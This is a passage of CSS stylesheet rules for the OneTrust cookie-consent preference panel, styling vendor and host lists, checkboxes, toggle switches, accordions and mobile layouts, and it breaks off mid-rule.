            #onetrust-pc-sdk .vendor-options:first-child {
                border-top: none;
            }
            #onetrust-pc-sdk .vendor-option:first-of-type {
                border-top: none;
            }
            #onetrust-pc-sdk .vendor-option {
                min-height: 30px;
                display: table;
                width: 100%;
                border-top: 1px solid #e2e2e2;
            }
            #onetrust-pc-sdk .vendor-option a {
                display: table-cell;
                vertical-align: middle;
                width: 120px;
            }
            #onetrust-pc-sdk .vendor-option a span {
                font-size: 0.75em;
                color: #3860be;
                width: 100px;
            }
            #onetrust-pc-sdk .vendor-option a svg {
                width: 18px;
                vertical-align: bottom;
            }
            #onetrust-pc-sdk .vendor-option p {
                display: table-cell;
                vertical-align: middle;
                word-break: break-word;
                word-wrap: break-word;
                margin: 0;
                padding: 0 0 0 15px;
                width: 150px;
                font-size: 0.75em;
                line-height: 1.4;
                color: #2e3644;
            }
            #onetrust-pc-sdk #vendors-list-container .accordion-header {
                overflow: hidden;
                cursor: pointer;
            }
            #onetrust-pc-sdk .vendor-options {
                border-radius: 2px;
            }
            #onetrust-pc-sdk .vendor-options p {
                font-size: 0.69em;
                text-align: left;
                display: table-cell;
                vertical-align: middle;
                word-break: break-word;
                word-wrap: break-word;
                margin: 0;
                padding-left: 15px;
                color: #2e3644;
            }
            #onetrust-pc-sdk #vendor-list-content.host-list-content {
                margin-left: 30px;
                margin-right: 7px;
            }
            #onetrust-pc-sdk #vendor-list-content.host-list-content .ot-sdk-column {
                padding: 0px;
            }
            #onetrust-pc-sdk #vendor-list-content.host-list-content + #vendor-list-save-btn {
                padding-left: 30px;
            }
            #onetrust-pc-sdk .hosts-list #vendors-list-header {
                margin-left: 0px;
            }
            #onetrust-pc-sdk .hosts-list .back-btn-handler {
                padding-left: 12px;
            }
            #onetrust-pc-sdk .hosts-list #vendors-list-title {
                margin-left: 30px;
            }
            #onetrust-pc-sdk .hosts-list #vendor-search-handler {
                margin-left: 30px;
            }
            #onetrust-pc-sdk #hosts-list-container .ot-checkbox {
                float: right;
                position: relative;
                margin-right: 42px;
                top: 10px;
            }
            #onetrust-pc-sdk #hosts-list-container .ot-checkbox input[type="checkbox"] {
                width: auto;
                height: auto;
            }
            #onetrust-pc-sdk #hosts-list-container .ot-checkbox label {
                height: 20px;
                width: 20px;
                padding-left: 0px;
            }
            #onetrust-pc-sdk #hosts-list-container .accordion-header {
                display: inline-block;
                width: 100%;
            }
            #onetrust-pc-sdk #hosts-list-container .accordion-text {
                overflow: hidden;
                width: 95%;
            }
            #onetrust-pc-sdk #hosts-list-container .host-info {
                width: 85%;
                float: left;
            }
            #onetrust-pc-sdk #hosts-list-container .host-title,
            #onetrust-pc-sdk #hosts-list-container .host-description {
                display: inline-block;
                width: 90%;
            }
            #onetrust-pc-sdk #hosts-list-container .host-info > a {
                text-decoration: underline;
                font-size: 0.82em;
                position: relative;
                z-index: 2;
                float: left;
                width: 100%;
                margin-bottom: 5px;
            }
            #onetrust-pc-sdk #hosts-list-container .host-title + a {
                margin-top: 5px;
            }
            #onetrust-pc-sdk #hosts-list-container .host-notice {
                margin-top: 3px;
            }
            #onetrust-pc-sdk #hosts-list-container .host-title,
            #onetrust-pc-sdk #hosts-list-container .host-title a,
            #onetrust-pc-sdk #hosts-list-container .host-description,
            #onetrust-pc-sdk #hosts-list-container .vendor-host {
                color: dimgray;
                word-break: break-word;
                word-wrap: break-word;
            }
            #onetrust-pc-sdk #hosts-list-container .host-title,
            #onetrust-pc-sdk #hosts-list-container .host-title a {
                font-weight: bold;
                font-size: 0.82em;
                line-height: 1.3;
            }
            #onetrust-pc-sdk #hosts-list-container .host-title a,
            #onetrust-pc-sdk #hosts-list-container .cookie-name-container a {
                font-size: 1em;
            }
            #onetrust-pc-sdk #hosts-list-container .host-notice h4 {
                color: #3860be;
                font-size: 0.72em;
                font-weight: normal;
                display: inline-block;
            }
            #onetrust-pc-sdk #hosts-list-container .host-notice h4 * {
                font-size: inherit;
            }
            #onetrust-pc-sdk #hosts-list-container .host-description,
            #onetrust-pc-sdk #hosts-list-container .vendor-host {
                font-size: 0.688em;
                line-height: 1.4;
                font-weight: normal;
            }
            #onetrust-pc-sdk #hosts-list-container .host-description {
                margin-top: 10px;
            }
            #onetrust-pc-sdk #hosts-list-container .host-item {
                padding: 10px 0px;
                overflow: auto;
            }
            #onetrust-pc-sdk #hosts-list-container .host-item:first-of-type {
                border-top: 1px solid #e2e2e2;
            }
            #onetrust-pc-sdk #hosts-list-container input:checked ~ .accordion-header .ot-arrow-container {
                border-left: 6px solid transparent;
                border-right: 6px solid transparent;
                border-top: 6px solid #737373;
                margin-top: 6px;
            }
            #onetrust-pc-sdk #hosts-list-container .ot-arrow-container {
                float: none;
                display: inline-block;
                vertical-align: middle;
                border-top: 6px solid transparent;
                border-bottom: 6px solid transparent;
                border-left: 6px solid #737373;
                margin-left: 10px;
            }
            #onetrust-pc-sdk #hosts-list-container .host-option-group {
                margin: 0;
                font-size: inherit;
                display: inline-block;
                width: 100%;
            }
            #onetrust-pc-sdk #hosts-list-container .host-option-group li > div div {
                font-size: 0.8em;
                padding: 5px 0;
            }
            #onetrust-pc-sdk #hosts-list-container .host-option-group li > div div:nth-child(1) {
                width: 30%;
                float: left;
            }
            #onetrust-pc-sdk #hosts-list-container .host-option-group li > div div:nth-child(2) {
                width: 70%;
                float: left;
                word-break: break-word;
                word-wrap: break-word;
            }
            #onetrust-pc-sdk #hosts-list-container .vendor-host {
                border: none;
                display: inline-block;
                width: calc(100% - 10px);
                padding: 10px;
                margin-bottom: 10px;
                background-color: #f8f8f8;
            }
            #onetrust-pc-sdk .vendor-option-purpose {
                border-top: 1px solid #e9e9e9;
                border-bottom: 1px solid #e9e9e9;
                margin-bottom: 10px;
                min-height: 30px;
                max-height: 50px;
                width: 100%;
                display: table;
            }
            #onetrust-pc-sdk .vendor-option-purpose:first-child,
            #onetrust-pc-sdk .vendor-option-purpose:first-of-type {
                border-top: none;
            }
            #onetrust-pc-sdk .vendor-option-purpose p {
                font-weight: bold;
            }
            #onetrust-pc-sdk .vendor-consent-group {
                display: inline-block;
                width: calc(100% - 15px);
                margin-bottom: 10px;
            }
            #onetrust-pc-sdk .legitimate-interest-group .consent-category {
                float: left;
            }
            #onetrust-pc-sdk .vendor-opt-out-handler {
                text-decoration: none;
                float: right;
                color: #3860be;
                position: relative;
            }
            #onetrust-pc-sdk .vendor-opt-out-handler span {
                font-size: 0.69em;
                line-height: 1.4;
            }
            #onetrust-pc-sdk .vendor-opt-out-handler svg {
                width: 15px;
                height: 15px;
                vertical-align: middle;
            }
            #onetrust-pc-sdk #no-results {
                text-align: center;
                margin-top: 30px;
                max-width: 93%;
            }
            #onetrust-pc-sdk #no-results p {
                font-size: 1em;
                color: #2e3644;
                word-break: break-word;
                word-wrap: break-word;
            }
            #onetrust-pc-sdk #no-results p span {
                font-weight: bold;
            }
            #onetrust-pc-sdk #filter-modal {
                width: 100%;
                height: auto;
                display: none;
                -moz-transition: 0.2s ease;
                -o-transition: 0.2s ease;
                -webkit-transition: 2s ease;
                transition: 0.2s ease;
                overflow: hidden;
                opacity: 1;
                right: 0;
            }
            #onetrust-pc-sdk #filter-modal .ot-pill {
                width: 130px;
                float: right;
                margin-top: 10px;
            }
            #onetrust-pc-sdk #options {
                z-index: 2147483646;
                background-color: #fff;
                position: absolute;
                height: auto;
                max-width: 325px;
                max-height: 450px;
                left: 195px;
                margin-top: 14px;
                margin-bottom: 20px;
                padding-right: 10px;
                border-radius: 3px;
                -webkit-box-shadow: 0px 0px 12px 2px #c7c5c7;
                -moz-box-shadow: 0px 0px 12px 2px #c7c5c7;
                box-shadow: 0px 0px 12px 2px #c7c5c7;
            }
            #onetrust-pc-sdk .group-options {
                max-height: 325px;
                overflow-y: auto;
                width: 100%;
            }
            #onetrust-pc-sdk #triangle {
                border: 12px solid transparent;
                display: none;
                position: absolute;
                z-index: 2147483647;
                right: 100px;
                top: 48px;
                transform: rotate(45deg);
                -o-transform: rotate(45deg);
                -ms-transform: rotate(45deg);
                -webkit-transform: rotate(45deg);
                background-color: #fff;
                -webkit-box-shadow: -3px -3px 5px -2px #c7c5c7;
                -moz-box-shadow: -3px -3px 5px -2px #c7c5c7;
                box-shadow: -3px -3px 5px -2px #c7c5c7;
            }
            #onetrust-pc-sdk .group-option {
                margin-bottom: 25px;
                margin-left: 15px;
                width: 75%;
            }
            #onetrust-pc-sdk .group-option p {
                display: inline-block;
                margin: 0;
                font-size: 0.9em;
                color: #2e3644;
            }
            #onetrust-pc-sdk .ot-checkbox input[type="checkbox"] {
                opacity: 0;
                margin: 0;
                position: absolute;
            }
            #onetrust-pc-sdk .ot-checkbox label {
                position: relative;
                display: inline-block;
                padding-left: 30px;
                cursor: pointer;
                font-weight: 500;
            }
            #onetrust-pc-sdk .ot-checkbox label span {
                font-size: 0.85em;
                color: dimgray;
            }
            #onetrust-pc-sdk .ot-checkbox input:checked ~ label::before {
                background-color: #3860be;
            }
            #onetrust-pc-sdk .ot-checkbox label::before,
            #onetrust-pc-sdk .ot-checkbox label::after {
                position: absolute;
                content: "";
                display: inline-block;
                border-radius: 3px;
            }
            #onetrust-pc-sdk .ot-checkbox label::before {
                height: 18px;
                width: 18px;
                border: 1px solid #3860be;
                left: 0px;
                top: 2px;
            }
            #onetrust-pc-sdk .ot-checkbox label::after {
                height: 5px;
                width: 9px;
                border-left: 3px solid;
                border-bottom: 3px solid;
                transform: rotate(-45deg);
                -o-transform: rotate(-45deg);
                -ms-transform: rotate(-45deg);
                -webkit-transform: rotate(-45deg);
                left: 4px;
                top: 7px;
            }
            #onetrust-pc-sdk .ot-checkbox input[type="checkbox"] + label::after {
                content: none;
                color: #fff;
            }
            #onetrust-pc-sdk .ot-checkbox input[type="checkbox"]:checked + label::after {
                content: "";
            }
            #onetrust-pc-sdk .ot-checkbox input[type="checkbox"]:focus + label::before {
                outline: #3860be auto 2px;
            }
            #onetrust-pc-sdk #select-all-text-container {
                height: auto;
                float: left;
                width: 83%;
            }
            #onetrust-pc-sdk #select-all-text-container p * {
                font-size: inherit;
            }
            #onetrust-pc-sdk #select-all-vendors-input-container,
            #onetrust-pc-sdk #select-all-hosts-input-container {
                width: 21px;
                height: auto;
                float: right;
            }
            #onetrust-pc-sdk #select-all-vendors-input-container label,
            #onetrust-pc-sdk #select-all-hosts-input-container label {
                float: left;
                padding-left: 0;
            }
            #onetrust-pc-sdk #select-all-vendors-input-container .group-option-box,
            #onetrust-pc-sdk #select-all-hosts-input-container .group-option-box {
                margin: 0;
            }
            #onetrust-pc-sdk .label-text {
                display: none;
            }
            #onetrust-pc-sdk #vendors-list-container:first-child {
                border-top: 1px solid #e2e2e2;
            }
            #onetrust-pc-sdk ul {
                list-style: none;
                padding: 0;
            }
            #onetrust-pc-sdk ul li {
                position: relative;
                margin: 0;
                padding: 15px 15px 15px 10px;
                border-bottom: 1px solid #e2e2e2;
            }
            #onetrust-pc-sdk ul li h3 {
                font-size: 0.75em;
                color: #656565;
                margin: 0;
                display: inline-block;
                width: 70%;
                height: auto;
                word-break: break-word;
                word-wrap: break-word;
            }
            #onetrust-pc-sdk ul li p {
                margin: 0;
                font-size: 0.7em;
            }
            #onetrust-pc-sdk ul li input[type="checkbox"] {
                position: absolute;
                cursor: pointer;
                width: 100%;
                height: 100%;
                opacity: 0;
                margin: 0;
                top: 0;
                left: 0;
            }
            #onetrust-pc-sdk ul li input[type="checkbox"]:not(:checked) ~ .accordion-text {
                margin-top: 0;
                max-height: 0;
                opacity: 0;
                overflow: hidden;
                width: 100%;
                transition: 0.25s ease-out;
                display: none;
            }
            #onetrust-pc-sdk ul li input[type="checkbox"]:checked ~ .accordion-text {
                transition: 0.1s ease-in;
                margin-top: 10px;
                width: 100%;
                display: block;
            }
            #onetrust-pc-sdk .category-vendors-list-container {
                margin-bottom: 0;
                width: 100%;
            }
            #onetrust-pc-sdk .category-vendors-list-handler,
            #onetrust-pc-sdk .category-vendors-list-handler + a {
                margin-left: 0;
                margin-top: 10px;
            }
            #onetrust-pc-sdk .vendor-option .op-out-group {
                float: right;
                margin-right: 10px;
            }
            #onetrust-pc-sdk #select-all-vendors-input-container.line-through label::after,
            #onetrust-pc-sdk #select-all-vendors-leg-input-container.line-through label::after,
            #onetrust-pc-sdk #select-all-hosts-input-container.line-through label::after {
                height: auto;
                border-left: 0;
                transform: none;
                -o-transform: none;
                -ms-transform: none;
                -webkit-transform: none;
                left: 5px;
                top: 10.5px;
            }
            #onetrust-pc-sdk #vendor-list-save-btn {
                position: relative;
                top: 38px;
                max-width: 90%;
                padding-left: 50px;
                padding-right: 50px;
            }
            #onetrust-pc-sdk #manage-cookies-text {
                float: left;
                font-size: 1.2em;
                width: 100%;
            }
            #onetrust-pc-sdk .button-theme {
                background-color: #68b631;
                color: #fff;
                border-color: #68b631;
                font-size: 0.75em;
                letter-spacing: 0.08em;
                margin-top: 19px;
            }
            #onetrust-pc-sdk .button-theme:hover,
            #onetrust-pc-sdk .button-theme:focus {
                color: #fff;
                border-color: #68b631;
            }
            #onetrust-pc-sdk #cookie-preferences {
                margin-top: 10px;
            }
            #onetrust-pc-sdk #cookie-preferences h4 {
                font-size: 0.9em;
                line-height: 1.3;
                max-width: 90%;
                vertical-align: middle;
            }
            #onetrust-pc-sdk .accordion-text .ot-switch,
            #onetrust-pc-sdk .ot-accordion-layout.category-item .ot-switch {
                position: relative;
                float: right;
                width: 45px;
                -webkit-user-select: none;
                -moz-user-select: none;
                -ms-user-select: none;
            }
            #onetrust-pc-sdk .accordion-text .switch-checkbox,
            #onetrust-pc-sdk .ot-accordion-layout.category-item .switch-checkbox {
                opacity: 0;
            }
            #onetrust-pc-sdk .accordion-text .ot-switch-label,
            #onetrust-pc-sdk .ot-accordion-layout.category-item .ot-switch-label {
                display: block;
                overflow: hidden;
                cursor: pointer;
                border: 1px solid #ddd;
                border-radius: 20px;
                background-color: #f2f1f1;
            }
            #onetrust-pc-sdk .accordion-text .ot-switch-inner,
            #onetrust-pc-sdk .ot-accordion-layout.category-item .ot-switch-inner {
                display: block;
                width: 200%;
                margin-left: -100%;
                transition: margin 0.2s ease-in 0s;
                -moz-transition: margin 0.2s ease-in 0s;
                -o-transition: margin 0.2s ease-in 0s;
                -webkit-transition: margin 0.2s ease-in 0s;
            }
            #onetrust-pc-sdk .category-item {
                line-height: 1.1;
                margin-top: 10px;
                display: inline-block;
                width: 100%;
            }
            #onetrust-pc-sdk .category-item .ot-switch-nob {
                width: 17px;
                height: 17px;
                right: 20px;
            }
            #onetrust-pc-sdk .category-item .ot-switch.toggle input {
                display: block;
                position: absolute;
            }
            #onetrust-pc-sdk .category-item .ot-switch.toggle input:focus + .ot-switch-label {
                outline: #3b99fc auto 5px !important;
            }
            #onetrust-pc-sdk .switch-checkbox.category-switch-handler {
                margin: 0;
                width: 0;
            }
            #onetrust-pc-sdk .save-preference-btn-container {
                margin-top: 20px;
                position: relative;
            }
            #onetrust-pc-sdk #close-pc-btn-handler.ot-close-icon,
            #onetrust-pc-sdk #vendor-close-pc-btn-handler.ot-close-icon {
                position: absolute;
                top: 25px;
                right: 25px;
                z-index: 1;
                padding: 0;
                background-color: transparent;
                border: none;
            }
            #onetrust-pc-sdk #close-pc-btn-handler.ot-close-icon:hover,
            #onetrust-pc-sdk #vendor-close-pc-btn-handler.ot-close-icon:hover {
                opacity: 0.7;
            }
            #onetrust-pc-sdk #close-pc-btn-handler.ot-close-icon svg,
            #onetrust-pc-sdk #vendor-close-pc-btn-handler.ot-close-icon svg {
                display: block;
                height: 10px;
                width: 10px;
            }
            #onetrust-pc-sdk .ot-switch-inner:before,
            #onetrust-pc-sdk .ot-switch-inner:after {
                display: block;
                width: 50%;
                height: 23px;
            }
            #onetrust-pc-sdk .ot-switch-inner:before {
                content: "";
                background-color: #d5e9ff;
            }
            #onetrust-pc-sdk .ot-switch-nob {
                display: block;
                margin: 2px;
                background: #7d7d7d;
                position: absolute;
                bottom: 0;
                border: 2px solid #7d7d7d;
                border-radius: 20px;
                transition: all 0.2s ease-in 0s;
                -moz-transition: all 0.2s ease-in 0s;
                -o-transition: all 0.2s ease-in 0s;
                -webkit-transition: all 0.2s ease-in 0s;
            }
            #onetrust-pc-sdk .switch-checkbox:checked + .ot-switch-label {
                transition: all 0.2s ease-in 0s;
                -moz-transition: all 0.2s ease-in 0s;
                -o-transition: all 0.2s ease-in 0s;
                -webkit-transition: all 0.2s ease-in 0s;
                border: 1px solid #3860be;
            }
            #onetrust-pc-sdk .switch-checkbox:checked + .ot-switch-label .ot-switch-inner {
                margin-left: 0;
            }
            #onetrust-pc-sdk .switch-checkbox:checked + .ot-switch-label .ot-switch-nob {
                right: 0px;
                background-color: #3860be;
                border-color: #3860be;
            }
            #onetrust-pc-sdk #clear-filters-handler {
                float: right;
                max-width: 200px;
                margin-bottom: 30px;
                text-decoration: none;
            }
            #onetrust-pc-sdk #clear-filters-handler p {
                float: right;
                font-weight: bold;
                color: #3860be;
                font-size: 0.9em;
                margin: 0;
            }
            #onetrust-pc-sdk #clear-filters-handler p:hover {
                color: #2285f7;
            }
            #onetrust-pc-sdk #clear-filters-container {
                width: 100%;
                height: auto;
                margin-top: 20px;
                float: right;
            }
            #onetrust-pc-sdk .category-switch-handler:not(:checked),
            #onetrust-pc-sdk .category-switch-handler:checked {
                position: initial;
                pointer-events: initial;
            }
            #onetrust-pc-sdk .ot-accordion-layout.category-item {
                position: relative;
                border-radius: 2px;
                margin: 0;
                padding: 0;
                border: 1px solid #e9e9e9;
                border-top: none;
                width: calc(100% - 2px);
                float: left;
            }
            #onetrust-pc-sdk .ot-accordion-layout.category-item:first-of-type {
                margin-top: 10px;
                border-top: 1px solid #e9e9e9;
            }
            #onetrust-pc-sdk .ot-accordion-layout.category-item > input[type="checkbox"] {
                position: absolute;
                cursor: pointer;
                width: 100%;
                height: 100%;
                opacity: 0;
                margin: 0;
                top: 0;
                left: 0;
                z-index: 1;
            }
            #onetrust-pc-sdk .ot-accordion-layout.category-item input[type="checkbox"]:not(:checked) ~ .accordion-text {
                margin-top: 0;
                max-height: 0;
                opacity: 0;
                overflow: hidden;
                width: 100%;
                transition: 0.25s ease-out;
            }
            #onetrust-pc-sdk .ot-accordion-layout.category-item input[type="checkbox"]:checked ~ .accordion-text {
                transition: 0.1s ease-in;
                margin-top: 10px;
                width: 100%;
                overflow: auto;
            }
            #onetrust-pc-sdk .ot-accordion-layout.category-item input[type="checkbox"]:checked ~ .ot-accordion-pc-container {
                width: auto;
                margin-top: 0px;
                padding-bottom: 10px;
            }
            #onetrust-pc-sdk .ot-accordion-layout .ot-accordion-group-pc-container {
                padding-left: 20px;
                padding-right: 15px;
                width: calc(100% - 35px);
                font-size: 0.82em;
                margin-bottom: 10px;
            }
            #onetrust-pc-sdk .ot-accordion-layout .accordion-header {
                padding-top: 11.5px;
                padding-bottom: 11.5px;
                padding-left: 20px;
                padding-right: 15px;
                width: calc(100% - 35px);
                display: inline-block;
            }
            #onetrust-pc-sdk .ot-accordion-layout .accordion-text {
                width: 100%;
                padding: 0px;
            }
            #onetrust-pc-sdk .ot-accordion-layout .cookie-subgroups-container {
                padding-left: 20px;
                padding-right: 15px;
                padding-bottom: 7.5px;
                margin: 0;
                width: calc(100% - 35px);
            }
            #onetrust-pc-sdk .ot-accordion-layout .ot-accordion-pc-container,
            #onetrust-pc-sdk .ot-accordion-layout .ot-switch.toggle {
                z-index: 1;
                position: relative;
            }
            #onetrust-pc-sdk .ot-accordion-layout .category-header + .ot-arrow-container {
                float: right;
                position: relative;
            }
            #onetrust-pc-sdk .ot-accordion-layout .category-header + .ot-arrow-container .ot-arrow {
                width: 15px;
                height: 20px;
                margin-left: 5px;
                color: dimgray;
            }
            #onetrust-pc-sdk .ot-accordion-layout .ot-always-active-group > .ot-arrow-container {
                top: -2px;
            }
            #onetrust-pc-sdk .ot-accordion-layout .category-header {
                float: none;
                font-size: 0.9em;
                color: #2e3644;
                margin: 0;
                display: inline-block;
                height: auto;
                word-wrap: break-word;
            }
            #onetrust-pc-sdk .ot-accordion-layout .category-vendors-list-container,
            #onetrust-pc-sdk .ot-accordion-layout .category-host-list-container {
                padding-left: 20px;
                width: calc(100% - 20px);
                display: inline-block;
                margin-top: 0px;
            }
            #onetrust-pc-sdk.ot-leg-opt-out .ot-toggle-group {
                width: 45px;
            }
            #onetrust-pc-sdk.ot-leg-opt-out #manage-cookies-text {
                padding-bottom: 10px;
            }
            #onetrust-pc-sdk.ot-leg-opt-out .leg-int-header {
                color: #77808e;
                overflow: hidden;
                padding-top: 7.5px;
                padding-bottom: 7.5px;
                width: calc(100% - 2px);
                border-top-left-radius: 3px;
                border-top-right-radius: 3px;
            }
            #onetrust-pc-sdk.ot-leg-opt-out .leg-int-header span:first-child {
                max-width: 80px;
            }
            #onetrust-pc-sdk.ot-leg-opt-out .leg-int-header span:last-child {
                padding-right: 10px;
                max-width: 95px;
                text-align: center;
            }
            #onetrust-pc-sdk.ot-leg-opt-out .leg-int-title {
                float: right;
                font-size: 13px;
            }
            #onetrust-pc-sdk.ot-leg-opt-out .leg-int-header.ot-leg-border-color {
                background-color: #f8f8f8;
                border: 1px solid #e9e9e9;
            }
            #onetrust-pc-sdk.ot-leg-opt-out .leg-int-header.ot-leg-border-color span:first-child {
                text-align: left;
                width: 80px;
            }
            #onetrust-pc-sdk.ot-leg-opt-out li.cookie-subgroup > h6,
            #onetrust-pc-sdk.ot-leg-opt-out .category-header {
                width: calc(100% - 125px);
            }
            #onetrust-pc-sdk.ot-leg-opt-out li.cookie-subgroup > h6 + .cookie-subgroup-toggle {
                padding-left: 13px;
            }
            #onetrust-pc-sdk.ot-leg-opt-out .ot-accordion-pc-container .ot-accordion-group-pc-container {
                margin-bottom: 5px;
            }
            #onetrust-pc-sdk.ot-leg-opt-out .ot-accordion-pc-container .cookie-subgroups-container {
                border-top: 1px solid #e9e9e9;
            }
            #onetrust-pc-sdk.ot-leg-opt-out .ot-accordion-pc-container ul.cookie-subgroups li {
                margin-top: 5px;
                margin-bottom: 5px;
            }
            #onetrust-pc-sdk.ot-leg-opt-out .ot-accordion-pc-container li.cookie-subgroup > h6 + .cookie-subgroup-toggle {
                padding-right: 20px;
            }
            #onetrust-pc-sdk.ot-leg-opt-out .accordion-header .ot-arrow-container + .ot-switch.toggle,
            #onetrust-pc-sdk.ot-leg-opt-out .accordion-text h4 + .ot-switch.toggle {
                padding-left: 13px;
            }
            #onetrust-pc-sdk.ot-leg-opt-out #select-all-text-container {
                text-align: right;
            }
            #onetrust-pc-sdk.ot-leg-opt-out .hosts-list #select-all-container .ot-checkbox {
                margin-right: 80px;
                right: 0;
            }
            #onetrust-pc-sdk.ot-leg-opt-out .hosts-list #select-all-text-container {
                width: 94%;
            }
            #onetrust-pc-sdk.ot-leg-opt-out #select-all-container .ot-checkbox {
                margin: 0;
                max-width: 100%;
                padding: 0;
                position: relative;
                right: 77px;
                width: calc(100% - 77px);
            }
            #onetrust-pc-sdk.ot-leg-opt-out #select-all-vendors-input-container {
                right: 10px;
                position: relative;
            }
            #onetrust-pc-sdk.ot-leg-opt-out .leg-int-sel-all-hdr {
                display: block;
                width: 100%;
                position: relative;
                height: 20px;
            }
            #onetrust-pc-sdk.ot-leg-opt-out .consent-hdr,
            #onetrust-pc-sdk.ot-leg-opt-out .leg-int-hdr {
                float: right;
                font-size: 0.8em;
            }
            #onetrust-pc-sdk.ot-leg-opt-out .leg-int-hdr {
                padding-right: 10px;
            }
            #onetrust-pc-sdk.ot-leg-opt-out #select-all-vendors-leg-input-container {
                display: block;
                width: 21px;
                height: auto;
                float: right;
                position: relative;
                right: 80px;
            }
            #onetrust-pc-sdk.ot-leg-opt-out #select-all-vendors-leg-input-container label {
                position: absolute;
            }
            #onetrust-pc-sdk.ot-leg-opt-out .ot-vendor-consent-tgl {
                margin-left: 60px;
            }
            #onetrust-pc-sdk.ot-leg-opt-out .ot-leg-int-tgl + .ot-arrow-container {
                margin-left: 81px;
            }
            #onetrust-pc-sdk.ot-leg-opt-out #vendor-list-content .ot-toggle-group {
                width: auto;
                top: auto;
            }
            #onetrust-pc-sdk.ot-leg-opt-out #vendor-list-content .ot-checkbox {
                position: relative;
                display: inline-block;
                width: 20px;
                height: 25px;
            }
            #onetrust-pc-sdk.ot-leg-opt-out #vendor-list-content .ot-checkbox label {
                position: absolute;
                padding: 0;
                width: 18px;
                height: 18px;
            }
            #onetrust-pc-sdk .ot-always-active-group .category-header {
                width: 55%;
            }
            #onetrust-pc-sdk .ot-accordion-group-pc-container + .ot-leg-btn-container {
                padding-left: 20px;
                padding-right: 15px;
                width: calc(100% - 35px);
                margin-bottom: 10px;
            }
            #onetrust-pc-sdk #vendors-list-container .ot-leg-btn-container {
                margin-top: 10px;
            }
            #onetrust-pc-sdk .ot-leg-btn-container {
                display: inline-block;
                width: 100%;
                margin-bottom: 10px;
            }
            #onetrust-pc-sdk .ot-leg-btn-container button {
                height: 32px;
                padding: 6.5px 8px;
                margin-bottom: 0;
                letter-spacing: 0;
            }
            #onetrust-pc-sdk .ot-leg-btn-container button:focus {
                outline: 0;
            }
            #onetrust-pc-sdk .ot-leg-btn-container svg {
                display: none;
                height: 14px;
                width: 14px;
                padding-right: 5px;
                vertical-align: sub;
            }
            #onetrust-pc-sdk .ot-active-leg-btn {
                cursor: default;
                pointer-events: none;
            }
            #onetrust-pc-sdk .ot-active-leg-btn svg {
                display: inline-block;
            }
            #onetrust-pc-sdk .ot-remove-objection-handler {
                border: none;
                text-decoration: underline;
                padding: 0;
                font-size: 0.82em;
                font-weight: 600;
                line-height: 1.4;
                padding-left: 10px;
            }
            #onetrust-pc-sdk .ot-obj-leg-btn-handler span {
                font-weight: bold;
                text-align: center;
                font-size: 0.91em;
                line-height: 1.5;
            }
            #onetrust-pc-sdk.otPcCenter[dir="rtl"] .accordion-text .vendor-option p {
                width: 27%;
            }
            #onetrust-pc-sdk.otPcCenter[dir="rtl"] .category-header,
            #onetrust-pc-sdk.otPcCenter[dir="rtl"] .category-vendors-list-container,
            #onetrust-pc-sdk.otPcCenter[dir="rtl"] .ot-toggle-group .ot-checkbox,
            #onetrust-pc-sdk.otPcCenter[dir="rtl"] .group-option,
            #onetrust-pc-sdk.otPcCenter[dir="rtl"] .ot-checkbox label {
                float: left;
            }
            #onetrust-pc-sdk.otPcCenter[dir="rtl"] input ~ .accordion-header .ot-arrow {
                transform: rotate(180deg);
                -o-transform: rotate(180deg);
                -ms-transform: rotate(180deg);
                -webkit-transform: rotate(180deg);
            }
            #onetrust-pc-sdk.otPcCenter[dir="rtl"] input:checked ~ .accordion-header .ot-arrow {
                transform: rotate(270deg);
                -o-transform: rotate(270deg);
                -ms-transform: rotate(270deg);
                -webkit-transform: rotate(270deg);
            }
            #onetrust-pc-sdk.otPcCenter[dir="rtl"] #search-container svg {
                right: 52px;
            }
            #onetrust-pc-sdk.otPcCenter[dir="rtl"] #back-arrow {
                transform: rotate(180deg);
                -o-transform: rotate(180deg);
                -ms-transform: rotate(180deg);
                -webkit-transform: rotate(180deg);
            }
            #onetrust-pc-sdk.otPcCenter[dir="rtl"] .ot-checkbox label::after {
                transform: rotate(45deg);
                -webkit-transform: rotate(45deg);
                -o-transform: rotate(45deg);
                -ms-transform: rotate(45deg);
                border-left: 0;
                border-right: 3px solid;
            }
            @media only screen and (min-width: 389px) and (max-width: 600px) {
                #onetrust-pc-sdk #select-all-container .ot-checkbox {
                    margin-right: 18.5%;
                }
                #onetrust-pc-sdk #options {
                    max-width: 335px;
                }
            }
            @media only screen and (max-width: 600px) {
                #onetrust-pc-sdk.ot-leg-opt-out #select-all-container .ot-checkbox {
                    right: 28px;
                    width: calc(100% - 28px);
                }
                #onetrust-pc-sdk .vendor-purposes {
                    transform: translate(50%, 150%);
                    -o-transform: translate(50%, 150%);
                    -ms-transform: translate(50%, 150%);
                    -webkit-transform: translate(50%, 150%);
                }
                #onetrust-pc-sdk #content {
                    margin: 0 3px 0 20px;
                    padding-right: 10px;
                    width: calc(100% - 33px);
                }
                #onetrust-pc-sdk #close-pc-btn-handler,
                #onetrust-pc-sdk #vendor-close-pc-btn-handler {
                    top: 10px;
                    right: 17px;
                }
                #onetrust-pc-sdk #vendor-list-content .ot-sdk-column {
                    padding-right: 0;
                }
                #onetrust-pc-sdk #vendor-list-save-btn {
                    width: 87%;
                    left: 20px;
                    padding-left: 0px;
                    top: 20px;
                }
                #onetrust-pc-sdk #pc-title {
                    font-size: 1.2em;
                }
                #onetrust-pc-sdk p {
                    font-size: 0.7em;
                }
                #onetrust-pc-sdk .ot-arrow {
                    margin-left: 10px;
                }
                #onetrust-pc-sdk #vendors-list-header {
                    margin: 10px 10px 0 5px;
                    width: 100%;
                }
                #onetrust-pc-sdk #vendor-search-handler {
                    margin-left: 15px;
                    width: 75%;
                    max-width: 325px;
                }
                #onetrust-pc-sdk #no-results p,
                #onetrust-pc-sdk #vendors-list-title {
                    width: 90vw;
                }
                #onetrust-pc-sdk input {
                    font-size: 1em !important;
                }
                #onetrust-pc-sdk #back-arrow {
                    margin-left: 12px;
                }
                #onetrust-pc-sdk #vendor-list-content {
                    margin: 0;
                    padding: 0 5px 0 10px;
                    min-width: 95%;
                }
                #onetrust-pc-sdk #select-all-container {
                    max-width: 90%;
                    min-width: 95%;
                }
                #onetrust-pc-sdk #select-all-container .ot-checkbox {
                    margin-right: 21px;
                }
                #onetrust-pc-sdk .switch + p {
                    max-width: 80%;
                }
                #onetrust-pc-sdk button {
                    width: 100%;
                }
                #onetrust-pc-sdk .button-theme {
                    letter-spacing: 0.01em;
                }
                #onetrust-pc-sdk #options {
                    left: 20px;
                    max-width: 320px;
                    width: 100%;
                    border-top-right-radius: 0;
                    border-bottom-right-radius: 0;
